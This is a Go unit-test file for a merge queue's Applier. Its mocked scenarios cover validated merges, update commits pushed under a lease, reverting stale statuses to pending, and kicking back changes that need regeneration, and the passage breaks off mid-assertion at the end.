package queue

import (
	"bytes"
	"context"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/mock"
	"github.com/stretchr/testify/require"

	"github.com/egladman/magus/internal/json"
	"github.com/egladman/magus/internal/queue/types"
	magustypes "github.com/egladman/magus/types"
)

// validated is the green verdict on c's candidate built onto onto, on top of after.
func validated(c types.Change, onto, after string) types.Verdict {
	return types.Verdict{BaseCommit: base, Change: c, Decision: types.DecisionMerge, After: after, Onto: onto,
		CandidateCommit: candidateOf(onto, c.Head), Method: c.Method, Depth: 1}
}

// applierFor wires an Applier to d for plan, whose verdicts arrive in one final poll.
// Every mark succeeds unless the test set [doubles.marks] first.
func applierFor(t *testing.T, d doubles, plan types.Plan, verdicts ...types.Verdict) *Applier {
	t.Helper()
	d.noCheckouts()
	d.noneGreen()
	d.marks(nil)
	d.src.EXPECT().Poll(mock.Anything).Return(types.VerdictBatch{Verdicts: verdicts, Done: true}, nil).Maybe()
	a, err := NewApplier(d.vcs, clone, d.provider, d.src, d.facts, t.TempDir())
	require.NoError(t, err)
	a.Base = "main"
	return a
}

// stackChecks answers applying's check of c's stack base: beneath its head and off the
// base.
func (d doubles) stackChecks(c types.Change) {
	d.vcs.EXPECT().IsAncestor(mock.Anything, clone.Root, c.StackBase, c.Head).Return(true, nil).Once()
	d.vcs.EXPECT().IsAncestor(mock.Anything, clone.Root, c.StackBase, base).Return(false, nil).Once()
}

// lists answers the provider's listing of main with changes, read once a stack is
// checked.
func (d doubles) lists(changes types.Changes) *mock.Call {
	return d.provider.EXPECT().ListChanges(mock.Anything, types.ListQuery{Base: "main"}).Return(changes, nil).Once()
}

// squashOf is the squash message applying writes for c, whose one commit is "change <id>".
func squashOf(c types.Change) string { return "* change " + c.ID }

// squashes answers the read of c's own commits applying writes its squash message from.
func (d doubles) squashes(c types.Change) {
	from := base
	if c.StackBase != "" {
		from = c.StackBase
	}
	d.vcs.EXPECT().RangeCommits(mock.Anything, clone.Root, from, c.Head, []string(nil)).
		Return([]magustypes.Commit{{ID: c.Head, Subject: "change " + c.ID, Parents: []string{from}}}, nil).Once()
}

// noneGreen answers that no open change carries the queue's success when a run starts.
// A dry run does not ask.
func (d doubles) noneGreen() {
	d.provider.EXPECT().ListGreen(mock.Anything, mock.Anything, DefaultStatusContext).Return(nil, nil).Maybe()
}

// bases answers the base branch's fetches in order.
func (d doubles) bases(commits ...string) {
	for _, c := range commits {
		d.vcs.EXPECT().FetchRef(mock.Anything, clone.Root, clone.Remote, "refs/heads/main").Return(c, nil).Once()
	}
}

// rechecks answers applying's re-check of c at its head with a.
func (d doubles) rechecks(c types.Change, a types.Approval) {
	d.vcs.EXPECT().FetchCommit(mock.Anything, clone.Root, clone.Remote, c.Head).Return(nil)
	d.plain(c.Head)
	d.provider.EXPECT().ApprovalAt(mock.Anything, mock.Anything, c.Head).Return(a, nil).Once()
}

func approvedAs(c types.Change) types.Approval {
	return types.Approval{Approved: true, Head: c.Head, Base: "main", Method: c.Method, Queued: true}
}

// rebuilds answers rebuilding c's candidate onto onto as the commit made, touching
// touched.
func (d doubles) rebuilds(c types.Change, onto, made string, touched ...string) {
	d.vcs.EXPECT().CreateCheckout(mock.Anything, clone.Root, mock.Anything, onto).RunAndReturn(makeCheckout).Once()
	d.vcs.EXPECT().StartMerge(mock.Anything, mock.Anything, c.Head, candidateIdentity).Return(nil).Once()
	d.vcs.EXPECT().Conflicts(mock.Anything, mock.Anything).Return(nil, nil).Once()
	d.vcs.EXPECT().Commit(mock.Anything, mock.Anything, magustypes.CheckoutCommit{CommitMeta: queueMeta("merge queue: candidate #"+c.ID, when)}).Return(made, nil).Once()
	d.vcs.EXPECT().DiffTrees(mock.Anything, clone.Root, onto, made).Return(touched, nil).Once()
	d.vcs.EXPECT().RemoveCheckout(mock.Anything, clone.Root, mock.Anything).Return(nil).Once()
}

// status expects commit status state on c's commit, its description starting with desc.
func (d doubles) status(c types.Change, commit string, state types.CommitState, desc string) *mock.Call {
	return d.provider.EXPECT().PostStatus(mock.Anything, mock.Anything, commit, mock.MatchedBy(func(s types.CommitStatus) bool {
		return s.Context == DefaultStatusContext && s.State == state && strings.HasPrefix(s.Description, desc)
	})).Return(nil).Once()
}

// mergesAt answers the provider's merge of c at commit, which the queue's call made,
// after which the base is at after with parents, carrying tree.
func (d doubles) mergesAt(c types.Change, commit, message, after, tree string, parents ...string) *mock.Call {
	return d.mergedAt(c, commit, message, after, tree, types.MergeResult{}, parents...)
}

// mergedAt is mergesAt with the provider reporting res.
func (d doubles) mergedAt(c types.Change, commit, message, after, tree string, res types.MergeResult, parents ...string) *mock.Call {
	d.squashes(c)
	call := d.provider.EXPECT().MergeChange(mock.Anything, mock.Anything, types.MergeOptions{Commit: commit, Message: message}).Return(res, nil).Once()
	d.vcs.EXPECT().TreeID(mock.Anything, clone.Root, after).Return(tree, nil).Once()
	d.vcs.EXPECT().FindCommit(mock.Anything, clone.Root, after).Return(magustypes.Commit{ID: after, Parents: parents}, nil).Maybe()
	return call
}

// green expects the success c's commit is posted right before its merge.
func (d doubles) green(c types.Change, commit string) *mock.Call {
	return d.status(c, commit, types.StateSuccess, "validated as ")
}

// cleanMerge is v's change merging at its head: rebuilt as validated onto the base, the
// base still there right before the merge, and the provider's own merge giving exactly
// the validated tree, which res says who made.
func (d doubles) cleanMerge(v types.Verdict, res types.MergeResult) (success, merge *mock.Call) {
	c := v.Change
	after := oid("after", c.ID)
	d.bases(base, base, after)
	d.rechecks(c, approvedAs(c))
	d.rebuilds(c, base, v.CandidateCommit, "a/x.go")
	d.vcs.EXPECT().TreeID(mock.Anything, clone.Root, v.CandidateCommit).Return("validated", nil).Once()
	d.vcs.EXPECT().MergeTrees(mock.Anything, clone.Root, magustypes.TreeMerge{Ours: base, Theirs: c.Head}).Return(magustypes.TreeMergeResult{Tree: "validated"}, nil).Once()
	d.provider.EXPECT().ApprovalAt(mock.Anything, mock.Anything, c.Head).Return(approvedAs(c), nil).Once()
	success = d.green(c, c.Head)
	merge = d.mergedAt(c, c.Head, squashOf(v.Change), after, "validated", res, base)
	return success, merge
}

func TestNewApplierRefusesAMissingPart(t *testing.T) {
	d := newDoubles(t)
	for name, tc := range map[string]struct {
		build func() (*Applier, error)
		want  string
	}{
		"vcs":      {func() (*Applier, error) { return NewApplier(nil, clone, d.provider, d.src, d.facts, "/s") }, "applier needs a VCS, a provider, a verdict source and build facts"},
		"provider": {func() (*Applier, error) { return NewApplier(d.vcs, clone, nil, d.src, d.facts, "/s") }, "applier needs a VCS, a provider, a verdict source and build facts"},
		"source":   {func() (*Applier, error) { return NewApplier(d.vcs, clone, d.provider, nil, d.facts, "/s") }, "applier needs a VCS, a provider, a verdict source and build facts"},
		"facts":    {func() (*Applier, error) { return NewApplier(d.vcs, clone, d.provider, d.src, nil, "/s") }, "applier needs a VCS, a provider, a verdict source and build facts"},
		"clone":    {func() (*Applier, error) { return NewApplier(d.vcs, Clone{}, d.provider, d.src, d.facts, "/s") }, "clone needs a root and a remote"},
		"relative": {func() (*Applier, error) { return NewApplier(d.vcs, clone, d.provider, d.src, d.facts, "s") }, `scratch directory "s" is not absolute`},
	} {
		_, err := tc.build()
		require.EqualError(t, err, tc.want, name)
	}
}

// I1 and I14: applying asks the provider to merge the head, pinned, only once its own
// rebuild is the validated candidate and the provider's merge gives the validated tree.
// Its success goes up right before the merge, so a provider merging on its own once the
// status passes merges then, and the merged event says who merged.
func TestAGreenChangeSucceedsRightBeforeItMergesAtItsHead(t *testing.T) {
	for name, res := range map[string]types.MergeResult{
		"merged on the queue's call":    {},
		"merged by the provider itself": {ByProvider: true},
	} {
		t.Run(name, func(t *testing.T) {
			d := newDoubles(t)
			c := change("1", "a")
			v := validated(c, base, "")
			d.caps()
			success, merge := d.cleanMerge(v, res)
			merge.NotBefore(success)
			var out bytes.Buffer
			a := applierFor(t, d, planOf([]types.Change{c}), v)
			a.Events = NewEvents(&out)
			require.NoError(t, a.Run(t.Context(), planOf([]types.Change{c})))
			assert.Contains(t, out.String(), `"kind":"merged","change":"1"`)
			assert.Equal(t, res.ByProvider, strings.Contains(out.String(), `"by_provider":true`))
		})
	}
}

// Main moving between applying's checks and the success leaves the change waiting: its
// merge was predicted onto a tip that is gone, and nothing goes green.
func TestABaseThatMovedRightBeforeTheSuccessLeavesTheChangeWaiting(t *testing.T) {
	d := newDoubles(t)
	c := change("1", "a")
	v := validated(c, base, "")
	moved := head("pushed to main")
	d.caps()
	d.bases(base, moved)
	d.rechecks(c, approvedAs(c))
	d.rebuilds(c, base, v.CandidateCommit, "a/x.go")
	d.vcs.EXPECT().TreeID(mock.Anything, clone.Root, v.CandidateCommit).Return("validated", nil)
	d.vcs.EXPECT().MergeTrees(mock.Anything, clone.Root, magustypes.TreeMerge{Ours: base, Theirs: c.Head}).Return(magustypes.TreeMergeResult{Tree: "validated"}, nil)
	d.provider.EXPECT().ApprovalAt(mock.Anything, mock.Anything, c.Head).Return(approvedAs(c), nil).Once()
	d.waits(c, c.Head, "main moved to "+moved[:12]+" before its merge")
	a := applierFor(t, d, planOf([]types.Change{c}), v)
	require.NoError(t, a.Run(t.Context(), planOf([]types.Change{c})))
}

// A run starts with nothing about to merge, so a success an earlier run left on an open
// change goes back to pending before anything else.
func TestARunSetsBackEverySuccessAnEarlierRunLeft(t *testing.T) {
	d := newDoubles(t)
	c := change("1", "a")
	stale := types.GreenChange{ID: "4", Repo: "acme/acme", Head: head("4")}
	d.caps()
	list := d.provider.EXPECT().ListGreen(mock.Anything, types.ListQuery{Base: "main"}, DefaultStatusContext).Return([]types.GreenChange{stale}, nil).Once()
	revoked := d.provider.EXPECT().PostStatus(mock.Anything, types.Change{ID: "4", Repo: "acme/acme", Head: stale.Head}, stale.Head,
		types.CommitStatus{Context: DefaultStatusContext, State: types.StatePending, Description: "waiting: an earlier run stopped before merging it"}).
		Return(nil).Once().NotBefore(list)
	d.status(c, c.Head, types.StatePending, "waiting: not validated in this run").NotBefore(revoked)
	a := applierFor(t, d, planOf([]types.Change{c}))
	require.NoError(t, a.Run(t.Context(), planOf([]types.Change{c})))
}

// A success applying cannot follow through goes back to pending before applying returns:
// left green, the change would merge later onto whatever the base is by then.
func TestASuccessApplyingCannotFollowThroughGoesBackToPending(t *testing.T) {
	d := newDoubles(t)
	s := d.atomicStack()
	merge := d.mergesAtomically(s, nil)
	d.vcs.EXPECT().FetchRef(mock.Anything, clone.Root, clone.Remote, "refs/heads/main").Return("", errors.New("network down")).Once().NotBefore(merge)
	for _, c := range []types.Change{s.one, s.two} {
		d.status(c, c.Head, types.StatePending, "waiting: applying stopped before its merge: resolve main: network down").NotBefore(merge)
	}
	a := applierFor(t, d, s.plan, s.v1, s.v2)
	require.ErrorContains(t, a.Run(t.Context(), s.plan), "network down")
}

// I1: the base must carry the tree the Applier predicted, or nothing more merges on a
// base nobody validated.
func TestABaseThatDoesNotCarryThePredictedTreeStopsApplying(t *testing.T) {
	d := newDoubles(t)
	one, two := change("1", "a"), change("2", "b")
	v := validated(one, base, "")
	after := oid("after", "1")
	d.caps()
	d.bases(base, base, after)
	d.rechecks(one, approvedAs(one))
	d.rebuilds(one, base, v.CandidateCommit, "a/x.go")
	d.vcs.EXPECT().TreeID(mock.Anything, clone.Root, v.CandidateCommit).Return("validated", nil)
	d.vcs.EXPECT().MergeTrees(mock.Anything, clone.Root, magustypes.TreeMerge{Ours: base, Theirs: one.Head}).Return(magustypes.TreeMergeResult{Tree: "validated"}, nil)
	d.provider.EXPECT().ApprovalAt(mock.Anything, mock.Anything, one.Head).Return(approvedAs(one), nil).Once()
	d.green(one, one.Head)
	d.mergesAt(one, one.Head, squashOf(v.Change), after, "other", base)
	a := applierFor(t, d, planOf([]types.Change{one}, []types.Change{two}), v, validated(two, base, ""))
	err := a.Run(t.Context(), planOf([]types.Change{one}, []types.Change{two}))
	require.ErrorContains(t, err, "#1 merged, but main at "+after[:12]+" carries tree other, not the validated validated")
}

// I15: the base's history has the shape the merge method gives.
func TestEveryMergeMethodMustMergeInItsOwnShape(t *testing.T) {
	tip, head := base, head("1")
	for name, tc := range map[string]struct {
		method  types.MergeMethod
		parents []string
		line    []magustypes.Commit
		wantErr bool
	}{
		"squash: one commit on the tip":        {method: types.MethodSquash, parents: []string{tip}},
		"squash that kept the head":            {method: types.MethodSquash, parents: []string{tip, head}, wantErr: true},
		"merge: the tip and the head":          {method: types.MethodMerge, parents: []string{tip, head}},
		"merge that squashed":                  {method: types.MethodMerge, parents: []string{tip}, wantErr: true},
		"rebase: a line of commits on the tip": {method: types.MethodRebase, line: []magustypes.Commit{{ID: "r2", Parents: []string{"r1"}}, {ID: "r1", Parents: []string{tip}}}},
		"rebase that left a merge commit":      {method: types.MethodRebase, line: []magustypes.Commit{{ID: "r2", Parents: []string{"r1", head}}, {ID: "r1", Parents: []string{tip}}}, wantErr: true},
	} {
		t.Run(name, func(t *testing.T) {
			d := newDoubles(t)
			d.vcs.EXPECT().TreeID(mock.Anything, clone.Root, "after").Return("tree", nil)
			d.vcs.EXPECT().FindCommit(mock.Anything, clone.Root, "after").Return(magustypes.Commit{ID: "after", Parents: tc.parents}, nil)
			if tc.method == types.MethodRebase {
				d.vcs.EXPECT().RangeCommits(mock.Anything, clone.Root, tip, "after", []string(nil)).Return(tc.line, nil)
			}
			r := &applyRun{Applier: &Applier{vcs: d.vcs, clone: clone}, plan: planOf()}
			err := r.mergedAs(t.Context(), change("1"), tip, "after", head, "tree", tc.method)
			if tc.wantErr {
				require.ErrorContains(t, err, "is not what a "+string(tc.method)+" merge onto")
				return
			}
			require.NoError(t, err)
		})
	}
}

// I14: where the provider's own merge would differ from the validated tree in declared
// outputs alone, applying pushes an update commit whose tree is the validated one on the
// head and the tip, authored and committed by the provider's committer, never by the
// identity the head claims, under a lease on the head, and merges that.
func TestAnUpdateCommitIsTheValidatedTreeOnTheHeadAndTheTip(t *testing.T) {
	d := newDoubles(t)
	c := change("1", "a")
	c.Branch = "feature"
	v := validated(c, base, "")
	after := oid("after", "1")
	update := head("update")
	d.caps()
	d.bases(base, base, after)
	d.rechecks(c, approvedAs(c))
	d.rebuilds(c, base, v.CandidateCommit, "a/x.go", "gen/x.go")
	d.vcs.EXPECT().TreeID(mock.Anything, clone.Root, v.CandidateCommit).Return("validated", nil)
	d.vcs.EXPECT().MergeTrees(mock.Anything, clone.Root, magustypes.TreeMerge{Ours: base, Theirs: c.Head}).Return(magustypes.TreeMergeResult{Tree: "plain"}, nil)
	d.vcs.EXPECT().DiffTrees(mock.Anything, clone.Root, "plain", "validated").Return([]string{"gen/x.go"}, nil).Twice()
	d.facts.EXPECT().Classify(mock.Anything, []string{"gen/x.go"}).Return(map[string]types.Writes{"gen/x.go": {Output: true}}, nil)
	d.vcs.EXPECT().RangeFiles(mock.Anything, clone.Root, base, c.Head, []string(nil)).Return([]string{"a/x.go"}, nil)
	d.facts.EXPECT().Generation(mock.Anything, []string{"gen/x.go"}, []string{"a/x.go"}).Return(types.Generation{Units: []string{"gen"}}, nil)
	d.vcs.EXPECT().CommitTree(mock.Anything, clone.Root, magustypes.TreeCommit{
		CommitMeta: magustypes.CommitMeta{Message: "merge main into #1 and regenerate generated files", Author: bot, Committer: bot},
		Tree:       "validated", Parents: []string{c.Head, base}}).Return(update, nil)
	push := d.vcs.EXPECT().Push(mock.Anything, clone.Root, magustypes.PushLease{Remote: clone.Remote, Ref: "refs/heads/feature", To: update, Expected: c.Head}).Return(nil).Call
	d.provider.EXPECT().ApprovalAt(mock.Anything, mock.Anything, update).Return(types.Approval{Approved: true, Head: update, Base: "main", Method: c.Method, Queued: true}, nil)
	success := d.green(c, update).NotBefore(push)
	d.mergesAt(c, update, squashOf(v.Change), after, "validated", base).NotBefore(success)
	a := applierFor(t, d, planOf([]types.Change{c}), v)
	a.Regenerate = func(context.Context, types.Regeneration) error {
		t.Error("the update commit's outputs come from the validated tree the rebuild reproduced")
		return nil
	}
	require.NoError(t, a.Run(t.Context(), planOf([]types.Change{c})))
}

// A change whose merge auto-resolution settles is merged through an update commit holding
// the settled file, since the provider's own merge stops on the conflict. Apply settles
// it itself twice, in its rebuild and against the tip, and takes nothing from the verdict
// but the commit it compares.
func TestAnAutoResolvedChangeMergesThroughAnUpdateCommitApplySettledItself(t *testing.T) {
	d := newDoubles(t)
	c := change("1", "a")
	c.Branch = "feature"
	v := validated(c, base, "")
	after := oid("after", "1")
	update := head("update")
	conflicts := []magustypes.Conflict{{Path: "CHANGELOG.md", Kind: magustypes.ConflictKindContent}}
	d.caps()
	d.bases(base, base, after)
	d.rechecks(c, approvedAs(c))
	d.vcs.EXPECT().CreateCheckout(mock.Anything, clone.Root, mock.Anything, base).RunAndReturn(func(_ context.Context, _, dir, _ string) error {
		require.NoError(t, os.MkdirAll(dir, 0o755))
		return os.WriteFile(filepath.Join(dir, "CHANGELOG.md"), []byte("<<<<<<< markers\n"), 0o644)
	}).Once()
	d.vcs.EXPECT().StartMerge(mock.Anything, mock.Anything, c.Head, candidateIdentity).Return(nil).Once()
	d.vcs.EXPECT().Conflicts(mock.Anything, mock.Anything).Return(conflicts, nil).Once()
	d.facts.EXPECT().Classify(mock.Anything, []string{"CHANGELOG.md"}).Return(genOutput, nil)
	d.facts.EXPECT().AutoResolvable(mock.Anything, "CHANGELOG.md", []byte("a\nz\n"), []byte("a\np\nq\nz\n")).Return(chVerdict, true, nil).Twice()
	d.vcs.EXPECT().MergeBase(mock.Anything, mock.Anything, base, c.Head).Return(head("mb"), true, nil).Twice()
	d.vcs.EXPECT().ReadFileAt(mock.Anything, mock.Anything, head("mb"), "CHANGELOG.md").Return("a\nz\n", nil).Twice()
	d.vcs.EXPECT().ReadFileAt(mock.Anything, mock.Anything, base, "CHANGELOG.md").Return("a\np\nz\n", nil).Twice()
	d.vcs.EXPECT().ReadFileAt(mock.Anything, mock.Anything, c.Head, "CHANGELOG.md").Return("a\nq\nz\n", nil).Twice()
	d.vcs.EXPECT().MarkResolved(mock.Anything, mock.Anything, []string{"CHANGELOG.md"}).Return(nil).Once()
	d.vcs.EXPECT().Commit(mock.Anything, mock.Anything, magustypes.CheckoutCommit{CommitMeta: queueMeta("merge queue: candidate #1", when)}).Return(v.CandidateCommit, nil).Once()
	d.vcs.EXPECT().DiffTrees(mock.Anything, clone.Root, base, v.CandidateCommit).Return([]string{"CHANGELOG.md"}, nil).Once()
	d.vcs.EXPECT().RemoveCheckout(mock.Anything, clone.Root, mock.Anything).Return(nil).Once()
	d.vcs.EXPECT().TreeID(mock.Anything, clone.Root, v.CandidateCommit).Return("validated", nil)
	d.vcs.EXPECT().MergeTrees(mock.Anything, clone.Root, magustypes.TreeMerge{Ours: base, Theirs: c.Head}).
		Return(magustypes.TreeMergeResult{Tree: "plain", Conflicts: conflicts}, nil)
	d.vcs.EXPECT().DiffTrees(mock.Anything, clone.Root, "plain", "validated").Return([]string{"CHANGELOG.md"}, nil).Twice()
	d.vcs.EXPECT().ReadFileAt(mock.Anything, clone.Root, "validated", "CHANGELOG.md").Return("a\np\nq\nz\n", nil).Once()
	d.vcs.EXPECT().CommitTree(mock.Anything, clone.Root, magustypes.TreeCommit{
		CommitMeta: magustypes.CommitMeta{Message: "merge main into #1 and regenerate generated files\n\nThe merge queue " + chNote + ".",
			Author: bot, Committer: bot},
		Tree: "validated", Parents: []string{c.Head, base}}).Return(update, nil)
	push := d.vcs.EXPECT().Push(mock.Anything, clone.Root, magustypes.PushLease{Remote: clone.Remote, Ref: "refs/heads/feature", To: update, Expected: c.Head}).Return(nil).Call
	d.provider.EXPECT().ApprovalAt(mock.Anything, mock.Anything, update).Return(types.Approval{Approved: true, Head: update, Base: "main", Method: c.Method, Queued: true}, nil)
	success := d.green(c, update).NotBefore(push)
	d.mergesAt(c, update, squashOf(v.Change), after, "validated", base).NotBefore(success)
	a := applierFor(t, d, planOf([]types.Change{c}), v)
	var events bytes.Buffer
	a.Events = NewEvents(&events)
	require.NoError(t, a.Run(t.Context(), planOf([]types.Change{c})))
	assert.Contains(t, events.String(), `"kind":"resolved","change":"1","reason":`+jsonString(t, chNote)+`,"commit":"`+v.CandidateCommit+`"`)
}

// jsonString is s as a JSON string literal, the way an event line carries it.
func jsonString(t *testing.T, s string) string {
	t.Helper()
	b, err := json.Marshal(s)
	require.NoError(t, err)
	return string(b)
}

// What the rebuild holds must be exactly what apply's own resolution against the tip
// makes; anything else is a difference no review covers.
func TestAResolutionTheTreeDoesNotHoldIsNotSettled(t *testing.T) {
	d := newDoubles(t)
	c := change("1", "a")
	a, err := NewApplier(d.vcs, clone, d.provider, d.src, d.facts, t.TempDir())
	require.NoError(t, err)
	r := &applyRun{Applier: a}
	conflicts := []magustypes.Conflict{{Path: "CHANGELOG.md", Kind: magustypes.ConflictKindContent}}
	d.facts.EXPECT().Classify(mock.Anything, []string{"CHANGELOG.md"}).Return(genOutput, nil)
	d.sides(base, c.Head, "CHANGELOG.md", "a\nz\n", "a\np\nz\n", "a\nq\nz\n")
	d.allows("CHANGELOG.md", "a\nz\n", "a\np\nq\nz\n", chVerdict, true)
	d.vcs.EXPECT().ReadFileAt(mock.Anything, clone.Root, "validated", "CHANGELOG.md").Return("a\nq\np\nz\n", nil)
	rd := &ready{v: validated(c, base, ""), tip: base, tree: "validated"}
	same, left, err := r.settledAsValidated(t.Context(), rd, magustypes.TreeMergeResult{Tree: "plain", Conflicts: conflicts}, []string{"CHANGELOG.md", "a/x.go"})
	require.NoError(t, err)
	assert.Empty(t, same)
	assert.Equal(t, []string{"CHANGELOG.md", "a/x.go"}, left)
}

// kicks expects c kicked back at its head with code, after re-reading its head.
func (d doubles) kicks(c types.Change, code types.Code, report string) {
	d.provider.EXPECT().ApprovalAt(mock.Anything, mock.Anything, c.Head).Return(approvedAs(c), nil).Once()
	d.status(c, c.Head, types.StateFailure, "kicked back")
	d.provider.EXPECT().KickBack(mock.Anything, mock.Anything, c.Head, mock.MatchedBy(func(k types.Kick) bool {
		return k.Code == code && strings.Contains(k.Report, report)
	})).Return(nil).Once()
}

// kicksWith expects c kicked back at its head with exactly want.
func (d doubles) kicksWith(c types.Change, want types.Kick) {
	d.provider.EXPECT().ApprovalAt(mock.Anything, mock.Anything, c.Head).Return(approvedAs(c), nil).Once()
	d.status(c, c.Head, types.StateFailure, "kicked back")
	d.provider.EXPECT().KickBack(mock.Anything, mock.Anything, c.Head, want).Return(nil).Once()
}

// waits expects c left queued at commit, its status naming reason.
func (d doubles) waits(c types.Change, commit, reason string) {
	d.status(c, commit, types.StatePending, "waiting: "+reason)
}

// updating sets up c's merge up to the update commit it needs, after the provider was
// described.
func (d doubles) updating(c types.Change, v types.Verdict) {
	d.bases(base)
	d.rechecks(c, types.Approval{Approved: true, Head: c.Head, Base: "main", Method: c.Method, Queued: true, BranchSharedWith: sharedWith[c.ID]})
	d.rebuilds(c, base, v.CandidateCommit, "gen/x.go")
	d.vcs.EXPECT().TreeID(mock.Anything, clone.Root, v.CandidateCommit).Return("validated", nil)
	d.vcs.EXPECT().MergeTrees(mock.Anything, clone.Root, magustypes.TreeMerge{Ours: base, Theirs: c.Head}).Return(magustypes.TreeMergeResult{Tree: "plain"}, nil)
	d.vcs.EXPECT().DiffTrees(mock.Anything, clone.Root, "plain", "validated").Return([]string{"gen/x.go"}, nil)
	d.facts.EXPECT().Classify(mock.Anything, []string{"gen/x.go"}).Return(map[string]types.Writes{"gen/x.go": {Output: true}}, nil)
	d.vcs.EXPECT().RangeFiles(mock.Anything, clone.Root, base, c.Head, []string(nil)).Return([]string{"a/x.go"}, nil)
	d.facts.EXPECT().Generation(mock.Anything, []string{"gen/x.go"}, []string{"a/x.go"}).Return(types.Generation{Units: []string{"gen"}}, nil)
}

var sharedWith = map[string][]string{"shared": {"9"}}

// An update commit is authored and committed by one identity: the provider's committer
// unless one was configured, and with neither the change waits and applying stops, since every
// change after it would need one too.
func TestAnUpdateCommitIsCommittedByTheConfiguredCommitterElseTheProviders(t *testing.T) {
	override := magustypes.Person{Name: "Release Bot", Email: "release@example.com"}
	for name, tc := range map[string]struct {
		configured magustypes.Person
		named      magustypes.Person
		want       magustypes.Person
	}{
		"the provider's":             {named: bot, want: bot},
		"a configured one overrides": {configured: override, named: bot, want: override},
		"a configured one alone":     {configured: override, want: override},
		"none":                       {},
	} {
		t.Run(name, func(t *testing.T) {
			d := newDoubles(t)
			c := change("1", "a")
			c.Branch = "feature"
			v := validated(c, base, "")
			d.provider.EXPECT().Describe(mock.Anything, applyQuery).
				Return(types.Capabilities{StackMerge: types.StackMergeSequential, Methods: []types.MergeMethod{types.MethodSquash}, Committer: tc.named}, nil)
			d.updating(c, v)
			if tc.want == (magustypes.Person{}) {
				d.waits(c, c.Head, "needs an update commit, and no committer is configured")
			} else {
				d.vcs.EXPECT().CommitTree(mock.Anything, clone.Root, mock.MatchedBy(func(tc2 magustypes.TreeCommit) bool {
					return tc2.Author == tc.want && tc2.Committer == tc.want
				})).Return(head("update"), nil)
				d.vcs.EXPECT().Push(mock.Anything, clone.Root, mock.Anything).Return(fmt.Errorf("push: %w", magustypes.ErrStaleLease))
				d.waits(c, c.Head, "its branch moved")
			}
			a := applierFor(t, d, planOf([]types.Change{c}), v)
			a.Committer = tc.configured
			a.Regenerate = func(context.Context, types.Regeneration) error { return nil }
			err := a.Run(t.Context(), planOf([]types.Change{c}))
			if tc.want == (magustypes.Person{}) {
				require.ErrorIs(t, err, types.ErrNoCommitter)
				return
			}
			require.NoError(t, err)
		})
	}
}

// An update commit goes only where the queue may push it, and only to the change it is
// for: a branch it cannot push to, or one another open change is headed at, sends the
// change back; a branch that moved waits; a push the branch refused sends it back.
func TestAnUpdateCommitGoesOnlyWhereItBelongs(t *testing.T) {
	for name, tc := range map[string]struct {
		branch string
		id     string
		push   error
		kick   string
		wait   string
		pushed bool
	}{
		"no branch":       {id: "1", kick: "the queue cannot push to its branch"},
		"a shared branch": {id: "shared", branch: "feature", kick: "its branch is also the head of #9, which would gain it too"},
		"a moved branch":  {id: "1", branch: "feature", push: fmt.Errorf("push: %w", magustypes.ErrStaleLease), wait: "its branch moved or was deleted since validation", pushed: true},
		"a refused push": {id: "1", branch: "feature", push: &magustypes.PushRejectedError{Ref: "refs/heads/feature", Reason: "protected branch hook declined"},
			kick: "its branch refused it: `protected branch hook declined`", pushed: true},
	} {
		t.Run(name, func(t *testing.T) {
			d := newDoubles(t)
			c := change(tc.id, "a")
			c.Branch = tc.branch
			v := validated(c, base, "")
			d.caps()
			d.updating(c, v)
			if tc.pushed {
				d.vcs.EXPECT().CommitTree(mock.Anything, clone.Root, mock.Anything).Return(head("update"), nil)
				d.vcs.EXPECT().Push(mock.Anything, clone.Root, mock.Anything).Return(tc.push)
			}
			if tc.kick != "" {
				d.kicks(c, types.CodeKickRefused, tc.kick)
			} else {
				d.waits(c, c.Head, tc.wait)
			}
			a := applierFor(t, d, planOf([]types.Change{c}), v)
			a.Regenerate = func(context.Context, types.Regeneration) error { return nil }
			require.NoError(t, a.Run(t.Context(), planOf([]types.Change{c})))
		})
	}
}

// Nothing validation produced is trusted: a rebuild that is not the validated candidate,
// with nothing to regenerate, is validated again rather than merged.
func TestACandidateTheRebuildDoesNotReproduceIsValidatedAgain(t *testing.T) {
	d := newDoubles(t)
	c := change("1", "a")
	v := validated(c, base, "")
	d.caps()
	d.bases(base)
	d.rechecks(c, approvedAs(c))
	d.rebuilds(c, base, head("rebuilt"), "a/x.go")
	d.facts.EXPECT().Classify(mock.Anything, []string{"a/x.go"}).Return(map[string]types.Writes{}, nil)
	d.waits(c, c.Head, "rebuilding its candidate gave "+head("rebuilt")[:12]+", not the validated "+v.CandidateCommit[:12])
	a := applierFor(t, d, planOf([]types.Change{c}), v)
	require.NoError(t, a.Run(t.Context(), planOf([]types.Change{c})))
}

// The job holding the write credential never runs a change's code: a merge needing
// outputs regenerated from code the change touched goes back to its author, and nothing
// is regenerated.
func TestAMergeNeedingRegenerationOfCodeTheChangeTouchedIsKickedBack(t *testing.T) {
	d := newDoubles(t)
	c := change("1", "a")
	v := validated(c, base, "")
	d.caps()
	d.bases(base)
	d.rechecks(c, approvedAs(c))
	d.rebuilds(c, base, head("rebuilt"), "gen/gen.go", "gen/x.go")
	d.facts.EXPECT().Classify(mock.Anything, []string{"gen/gen.go", "gen/x.go"}).Return(map[string]types.Writes{"gen/x.go": {Output: true}}, nil)
	d.vcs.EXPECT().RangeFiles(mock.Anything, clone.Root, base, c.Head, []string(nil)).Return([]string{"gen/gen.go"}, nil)
	d.facts.EXPECT().Generation(mock.Anything, []string{"gen/x.go"}, []string{"gen/gen.go"}).Return(types.Generation{Units: []string{"gen"}, Code: []string{"gen/gen.go"}}, nil)
	marks := d.marks(nil)
	d.provider.EXPECT().ApprovalAt(mock.Anything, mock.Anything, c.Head).Return(approvedAs(c), nil).Once()
	d.status(c, c.Head, types.StateFailure, "kicked back")
	d.provider.EXPECT().KickBack(mock.Anything, mock.Anything, c.Head, mock.MatchedBy(func(k types.Kick) bool {
		return k.Code == types.CodeKickRegeneration &&
			strings.Contains(k.Report, "it changes code their regeneration runs (`gen/gen.go`), so only its author can regenerate them") &&
			strings.Contains(k.Report, "Merge `main` in, regenerate, and push. Then queue it again")
	})).Run(func(context.Context, types.Change, string, types.Kick) { marks.add("kicked") }).Return(nil).Once()
	a := applierFor(t, d, planOf([]types.Change{c}), v)
	a.Regenerate = func(context.Context, types.Regeneration) error {
		t.Error("regenerated from code the change touched")
		return nil
	}
	require.NoError(t, a.Run(t.Context(), planOf([]types.Change{c})))
	assert.Equal(t, []string{"1 queued", "kicked", "1 needs_regeneration"}, marks.entries(),
